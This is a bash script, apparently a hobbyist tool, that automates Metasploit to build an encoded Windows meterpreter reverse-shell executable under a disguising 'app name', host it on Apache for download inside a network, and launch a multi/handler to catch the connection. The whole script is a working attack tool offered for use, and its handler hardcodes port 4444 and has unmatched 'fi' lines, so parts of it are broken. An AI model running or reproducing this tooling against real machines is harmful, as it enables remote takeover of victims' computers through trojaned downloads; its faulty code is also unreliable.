#!/bin/bash

BRed='\033[1;31m'	  # Red
BGreen='\033[1;32m'       # Green
BYellow='\033[1;33m'      # Yellow
BBlue='\033[1;34m'        # Blue
BPurple='\033[1;35m'      # Purple
BCyan='\033[1;36m'        # Cyan
BWhite='\033[1;37m'       # White
URed='\033[4;31m' 
On_Red='\033[41m'	#Bgcolor
COLOR='\e[0m'		#close						
#echo -e "$colorname"
#echo -e "$COLOR"					
echo " "
echo -e "$BWhite Automate_Metasploit_EFX"
echo "^------------------------^"
echo -e "$On_Red $BWhite                                Created by:-$COLOR"
echo -e "$BYellow| ____|  ___\ \/ / |_   _|_   __"
echo -e "$BWhite|  _| | |_   \  /    | | \ \ / /"
echo -e "$BGreen| |___|  _|  /  \    | |  \ V / "
echo -e "$BGreen|_____|_|   /_/\_\   |_|   \_/  "
echo -e "$BWhite			Please Subscribe"
echo -e "$On_Red Make sure your msfdb should be connected.$COLOR""$BBlue"
sleep 1
echo " "
read -r -p " Please press yes to start postgresql [y/N]: " post
if [[ "$post" =~ ^([yY][eE][sS]|[yY])+$ ]]
then
     echo -e " Starting Postgresql.." 
     echo -e " Pleasea wait... "
	sudo service postgresql start
	echo -e "$BGreen" "Successfully Started ✔ ✔ ✔ ✔ $BBlue"
fi
echo -e -n "$BBlue Your app name please? [ENTER]$BWhite: "
read name 
echo -e -n "$BBlue LPORT for $name [ENTER]$BWhite: "
read port
ifconfig | grep "inet 192"
echo -e -n "$BBlue LHOST for $name [ENTER]$BWhite: "
read ip 
echo -e '\e[5m Ready to go it can take some time...\e[25m'
sleep 2
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -b "\x00" -e x86/shikata_ga_nai -f exe -o $name.exe
echo " "
echo -e "$BGreen $name is powerful! Give it a try!" 
echo -e " Here is the $name location \e[5m✔ ✔ ✔\e[25m:"$On_Red$BWhite$PWD/$name.exe $COLOR $BBlue 
read -r -p " Do you want to send the $name to /var/www/html/  now? [y/N] " moveap
if [[ "$moveap" =~ ^([yY][eE][sS]|[yY])+$ ]]
then
     echo -e " A copy of $name will be created to /var/www/html "
     sleep 2
	sudo cp $name.exe /var/www/html/

	echo -e "$BGreen" "✔ ✔ ✔ ✔ Successfully Copied ✔ ✔ ✔ ✔ $BBlue"
fi
	read -r -p "Do you want to run Apache2 server ? [y/N] " apacheon
if [[ "$apacheon" =~ ^([yY][eE][sS]|[yY])+$ ]]
then
     	sudo service apache2 start
	echo -e "$BWhite Please wait verifying your request"
	sleep 1
	echo -e "$BGreen Apache2 has started successfylly... Have fun with $name $BWhite"
	sleep 1
	echo "You can download the app inside the network using link :"" ""http://"$ip"/"$name".exe"
 	echo "use exploit/multi/handler
 	
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST" ""$ip" 
set LPORT" ""4444" 
exploit" | tee win.rc

echo "Now Starting Msf multi/handler for you!"
msfconsole -r win.rc

else
    echo "Great you can get back later"
fi
fi
fi
sleep 10
echo "Sorry for that, please let us know the reason to close! "
